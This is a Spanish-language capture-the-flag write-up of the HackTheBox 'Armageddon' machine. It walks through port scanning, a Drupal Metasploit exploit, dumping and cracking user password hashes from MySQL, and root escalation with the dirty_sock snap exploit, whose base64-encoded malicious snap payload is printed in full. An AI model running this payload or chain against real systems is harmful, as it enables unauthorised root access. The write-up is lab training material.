---
title: HackTheBox Armageddon
date: 2021-07-24 12:00:00 -0400
image: 
  path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/banner.png 
  height: 1100
  width: 500
categories: [HTB Writeups, Linux Easy]
tags: [sql, drupal, mysql, suid, exploit, python]
---

***

**Machine IP** : 10.10.10.233

**DATE**  : 24/07/2021

***

## Matriz de la maquina


Esta matriz nos muestra las características de explotación de la maquina.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/matrix.png)


## Reconocimiento
Primero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.

## Nmap 

```bash
┌──(s4yhii㉿kali)-[~]
└─$ nmap -p22,80 -sC -sV -n 10.10.10.233 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 05:46 EDT
Nmap scan report for 10.10.10.233
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
```

Como podemos obervar tenemos 2 puertos abiertos, el 80 con el servicio http y el 22 ssh, como vemos cuenta con el archivo robots.txt y otros más interesantes, procederemos a inspeccionar en la web.

Como podemos ver, el servicio web esta corriendo en el `framework drupal`, revisando en `mestasploit` encontramos un exploit que nos permite obtener una `shell`

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/metas.png)

Luego de configurar los parametros del payload, obtenemos una shell en `metasploit` y ahora si podemos listar y ver los archivos del servidor web.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/shell.png)

Luego de inspeccionar cada archivo, dentro del archivo `settings.php` encontramos estas credenciales.

Credenciales de la base de datos

```bash
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
```

Como indica, son las credenciales de una base de datos, entonces vamos a enumerar las tablas que contiene esa base de datos y posteriormente lo interesante que surga de eso, usando el siguiente comando.

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;'

mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select * from users;'

mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/showtables.png)

El resultado es el siguiente, encontramos un usuario y una contraseña hasheada del usuario `brucetherealadmin`.

```bash
brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
nishi   $S$DDiENuC75Il7Oc4El2weC1X.cDu5pjl6foNQtkIX.t63MwU6H7Ta
test    $S$DN3zVAhdweEONvPDq9qvZaElRWXaTEyaABfnm5ciyaGxuj0cjKYs
aaa     $S$DZ7r4xaW5fCslHhuZ0ICo/LljhMt575vdSkXFUJgbPwo3JDyzlKa
juan    $S$Dum5w6EtPuSuJsOpkOLqlyKGRn96vKgbXFW90NK4TnUH8tMsLWTC
```

Guardemos el hash en un archivo txt y usamos a nuestro amigo `john` para que nos salve.

```bash
john user\_hash.txt \--wordlist\=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8 Loaded 14 password hashes with 5 different salts (Drupal7, $S$ \[SHA512 256/256 AVX2 4x\]) Cost 1 (iteration count) is 32768 for all loaded hashes Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 
booboo (?)
```

Obtenemos la contraseña `booboo`, con esto nos logeamos via `ssh` y accedemos al usuario `brucetherealadmin` y obtenemos el `usert.txt`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/usertxt.png)

## Escalamiento de privilegios

Luego de usar el comando `sudo -l`.

```bash
[brucetherealadmin@armageddon ~\]$ sudo \-l Matching Defaults entries for brucetherealadmin on armageddon: !visiblepw, always\_set\_home, match\_group\_by\_gid, always\_query\_group\_plugin, env\_reset, env\_keep\="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS\_COLORS", env\_keep+\="MAIL PS1 PS2 QTDIR USERNAME LANG LC\_ADDRESS LC\_CTYPE", env\_keep+\="LC\_COLLATE LC\_IDENTIFICATION LC\_MEASUREMENT LC\_MESSAGES", env\_keep+\="LC\_MONETARY LC\_NAME LC\_NUMERIC LC\_PAPER LC\_TELEPHONE", env\_keep+\="LC\_TIME LC\_ALL LANGUAGE LINGUAS \_XKB\_CHARSET XAUTHORITY", secure\_path\=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User brucetherealadmin may run the following commands on armageddon: (root) NOPASSWD: /usr/bin/snap install \*
C
```

Se puede usar el binario `nap install`, buscando en `google` algunas vulnerabilidades de dar permisos de `root` a estas dependencias, me encuentro con este [Github](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) donde está el exploit que nos indica su funcionalidad con el siguiente banner.

```bash
Simply run as is, no arguments, no requirements. If the exploit is successful,

the system will have a new user with sudo permissions as follows:

username: dirty\_sock

password: dirty\_sock
```

Significa que agregará el usuario `dirty_sock` con el mismo usuario y contraseña pero con permisos `sudo`, y esto podriamos utilizarlo para invocar una shell como `root`, guardamos el codigo del exploit con este comando.

```python2
python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > privesc.snap
```

Luego de crear el paquete snap de instalacion, lo instalamos con el siguiente comando.

```python2
sudo /usr/bin/snap install --devmode privesc.snap
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/privesc.png)

Luego revisames el archivo passwd con el comando `cat /etc/passwd`

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/passwd.png)

Nos logeamos como `dirty_sock` , la contraseña por defecto es `dirty_sock`.

Luego de estar logeados, ingresamos el comando sudo bash para invocar una shell como `root`, y luego ya somos `root`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/armageddon/roottxt.png)

Game over, obtenemos sesion como `root` y el `root.txt`.


## Conclusiones


Fue una maquina agradable con debilidades que, por desgracia, siguen siendo muy comunes por ahí.

Algunas reflexiones y conclusiones de este pentest:

Mantener actualizadas las tecnologias usadas para la construcción de tu pagina web.

No exponer contraseñas ni usuarios en los archivos de configuración.

Almacene sus claves privadas en un repositorio protegido por una autenticación multifactorial. No las dejes "en línea" si no es necesario y no pienses que nadie las encontrará sólo porque crees que las escondiste bien.

Evita jugar con la configuración de sudo si no estás seguro de lo que haces y de cómo se puede abusar de ello. Echa un vistazo a GTFObins para empezar...

Gracias por leer, Happy hacking and always try harder!

Gracias por leer.